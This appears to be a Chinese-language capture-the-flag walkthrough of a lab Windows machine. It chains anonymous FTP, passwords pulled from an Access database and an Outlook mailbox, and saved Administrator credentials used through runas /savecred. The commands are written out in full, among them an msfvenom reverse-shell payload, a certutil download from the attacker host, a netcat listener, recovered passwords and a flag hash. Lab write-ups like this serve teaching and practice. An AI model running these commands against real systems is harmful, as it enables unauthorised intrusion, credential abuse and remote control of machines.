Phase 0–1

立足点：FTP → MDB → ZIP → PST → 密码

$ ftp 10.129.18.45
anonymous login
ftp> binary  ← 必须！
ftp> get backup.mdb
ftp> get "Access Control.zip"
$ mdb-export backup.mdb auth_user
engineer,access4u@security

$ 7z x "Access Control.zip" -paccess4u@security
$ readpst "Access Control.pst"
$ cat "Access Control.mbox"
The password for "security" has been changed to 4Cc3ssC0ntr0ller

Phase 2

权限提升：runas /savecred

C:\> cmdkey /list
Target: Domain:interactive=ACCESS\Administrator
Type: Domain Password
🧒 儿童版 — 借老板工卡刷门Windows 的"记住密码"功能保存了 Administrator 的凭据。我们可以直接用这个保存的密码，以管理员身份运行任何程序——不需要知道密码是什么。
$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.152 LPORT=5555 -f exe > admin.exe
C:\> certutil -urlcache -f http://10.10.14.152:8000/admin.exe C:\temp\admin.exe
C:\> runas /savecred /user:ACCESS\Administrator "C:\temp\admin.exe"

$ nc -lnvp 5555
C:\Users\Administrator> type root.txt
e21898197913736b753f75ffa7f08595

知识点总结

FTP binary 模式。

下载二进制文件（MDB、ZIP）必须 binary，否则文件损坏。

MDB = mdb-tools，PST = readpst。

Linux 下处理微软格式的专用工具。

runas /savecred。

cmdkey /list 检查存储的凭据。有 savecred 就能以对应用户身份运行任何程序。

FTP → MDB → ZIP → PST → Telnet→runas /savecred → Admin
